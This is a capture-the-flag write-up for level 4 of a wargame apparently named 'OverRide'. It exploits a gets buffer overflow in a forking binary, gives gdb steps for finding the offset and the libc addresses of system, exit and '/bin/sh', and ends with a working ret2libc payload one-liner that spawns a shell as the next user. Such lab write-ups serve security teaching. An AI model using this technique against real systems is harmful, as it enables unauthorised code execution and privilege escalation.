# Level 4

This program asks us for some shellcode after a buffer overflow through gets, let's (not) oblige.

The subtility this time is that a lot of the stuff happens in a child process. Let's tell gdb to follow the child:
```shell
(gdb) set follow-fork-mode child
```

Now we'll find the offset of `eip` with our [usual suspect](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
```shell
(gdb) r < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
Starting program: /home/users/level04/level04 < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
[New process 31421]
child is exiting...
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 31421]
0x41326641 in ?? ()
```
Our offset is at 156

Now let's do a ret2libc attack to be contrarians. [Here's a comprehensive explanation of it I've written](https://gist.github.com/selfsigned/0a836f3d98efc512509cc042b449160a)
```shell
(gdb) p system
$1 = {
    <text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {
    <text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 31421
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
[...]
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
[...]

(gdb) p/x "/bin/sh"
$3 = {0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0}
(gdb) find /b 0xf7e2c000, 0xf7fd0000, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0                     
0xf7f897ec
```
Okay, `system -> 0xf7e6aed0` `exit -> 0xf7e5eb70` `"/bin/sh" -> 0xf7f897ec`

```shell
level04@OverRide:~$ (python -c 'print "B"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat) | ./level04 
Give me some shellcode, k
whoami
level05
```
Yeet!
